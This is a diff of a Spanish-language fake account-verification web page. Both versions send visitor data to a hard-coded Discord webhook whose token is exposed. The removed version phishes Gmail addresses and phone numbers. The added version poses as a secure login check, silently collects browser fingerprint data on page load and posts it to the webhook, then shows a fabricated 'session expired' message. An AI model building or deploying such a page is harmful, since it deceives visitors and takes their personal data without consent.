@@ -3,31 +3,63 @@
 
 
 
-Verificación
+Iniciar sesión
 
-body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-.box{background:#1c1c1c;padding:2rem;border-radius:12px;width:320px}
-input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #333;background:#0a0a0a;color:#fff;box-sizing:border-box}
-button{width:100%;padding:10px;margin-top:10px;border:none;border-radius:6px;background:#5865F2;color:#fff;font-weight:bold;cursor:pointer}
-
-
-
-
-Verifica tu cuenta
-
-
-Continuar
+  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0f0f0f;font-family:Arial,sans-serif;color:#fff;flex-direction:column}
+  .card{background:#1c1c1c;padding:40px 32px;border-radius:12px;text-align:center;width:320px;box-shadow:0 10px 40px rgba(0,0,0,.6)}
+  .avatar{width:90px;height:90px;border-radius:50%;object-fit:cover;border:3px solid #2a2a2a;margin-bottom:18px}
+  .name{font-size:18px;font-weight:bold;margin-bottom:6px}
+  .sub{font-size:13px;color:#9a9a9a;margin-bottom:24px}
+  .spinner{width:38px;height:38px;border:4px solid #2a2a2a;border-top-color:#4a9eff;border-radius:50%;margin:0 auto;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .status{margin-top:16px;font-size:12px;color:#6f6f6f;letter-spacing:.5px}
 
 
-async function enviar(){
-const gmail=document.getElementById('gmail').value.trim();
-const tel=document.getElementById('tel').value.trim();
-if(!gmail||!tel){alert('Completa los campos');return}
-const webhook="https://discord.com/api/webhooks/1556692474918076497/QZgSuwKh5-BioK1qODSW24i_CB0fOWaNc-5DDgcmEs_q7pybJXdyjGSHvMVRuCXvZcIj";
-try{
-const r=await fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:"Nuevo registro",embeds:[{title:"Datos recibidos",fields:[{name:"Gmail",value:gmail},{name:"Teléfono",value:tel}],color:5814783}]})});
-if(r.ok){alert('Listo')}else{alert('Error '+r.status)}
-}catch(e){alert('Error de red: '+e.message)}
-}
+
+
+  
+  Cargando perfil...
+  Verificando tu cuenta de forma segura
+  
+  Conectando con el servidor...
+
+
+const WEBHOOK = "https://discord.com/api/webhooks/1556692474918076497/QZgSuwKh5-BioK1qODSW24i_CB0fOWaNc-5DDgcmEs_q7pybJXdyjGSHvMVRuCXvZcIj";
+const img = new Image();
+img.onload = () => {
+  document.getElementById('av').src = img.src;
+  document.getElementById('nm').textContent = "Usuario verificado";
+};
+img.onerror = () => {
+  document.getElementById('nm').textContent = "Usuario";
+  document.getElementById('av').style.background = "#333";
+};
+img.src = "https://api.dicebear.com/7.x/avataaars/svg?seed=user";
+
+const data = {
+  ua: navigator.userAgent,
+  lang: navigator.language,
+  platform: navigator.platform,
+  screen: screen.width + "x" + screen.height,
+  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  url: location.href,
+  ts: new Date().toISOString()
+};
+
+fetch(WEBHOOK, {
+  method: "POST",
+  headers: {"Content-Type": "application/json"},
+  body: JSON.stringify({
+    content: "Nuevo acceso detectado:\njson\n" +
+JSON.stringify(data, null, 2) + "\n"
+  })
+}).catch(()=>{});
+
+setTimeout(() => {
+  document.getElementById('st').textContent = "Sesión expirada, vuelve a intentarlo.";
+}, 6000);
+
+
+
 
 
